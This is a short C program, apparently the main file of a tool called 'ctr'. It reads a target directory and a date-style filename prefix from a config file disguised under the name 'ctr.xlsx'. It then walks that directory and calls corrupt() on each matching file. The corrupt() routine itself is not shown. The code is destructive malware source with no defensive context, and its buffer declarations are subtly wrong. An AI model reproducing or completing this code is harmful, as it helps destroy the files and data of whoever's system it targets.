#include <string.h>
#include "ctr.h"

// trim: remove trailing blanks, tabs, newlines *1
int trim(char s[])
{
	int n;
	for (n = strlen(s)-1; n >= 0; n--)
		if (s[n] != ' ' && s[n] != '\t' && s[n] != '\n')
			break;
	s[n+1] = '\0';
	return n;
}

int main(int argc, char const *argv[])
{

	// todo while(1)

	FILE* fconf = fopen("ctr.xlsx", "r");

	char* target_dir[256]; // target dir read from ctr.xlsx
	char* pattern_prefix[128]; // 20190101
	fgets(target_dir, 256, fconf); // clean trailing newline
	fgets(pattern_prefix, 128, fconf);

	trim(target_dir);
	trim(pattern_prefix);

	fclose(fconf);
	
	// printf("fexists(\"%s\"): %d", target_dir, fexists(target_dir));
	if (FALSE == fexists(target_dir)) {	return 0;}

	// printf("target_dir is     %s", target_dir);
	// printf("pattern_prefix is %s\n", pattern_prefix);

	struct dirent **eps;
	int n = scandir (target_dir, &eps, filter, alphasort); // dirent: alphasort
	if (n >= 0)
	{
		int cnt;
		char filepath[1024];
		for (cnt = 0; cnt < n; ++cnt)
		{
			// printf("%s\n", eps[cnt]->d_name); 
			strcpy(filepath, target_dir);
			strcat(filepath, eps[cnt]->d_name);
			// corrupt(eps[cnt]->d_name);
			if (FALSE == is_filepath_target(filepath, pattern_prefix)) continue;
			corrupt(filepath);
			// printf("corrupting %s\n", filepath);
		}
	} else {
		perror ("Couldn't open the directory");
		// printf("%s\n", target_dir);
	}
	
	return 0;
}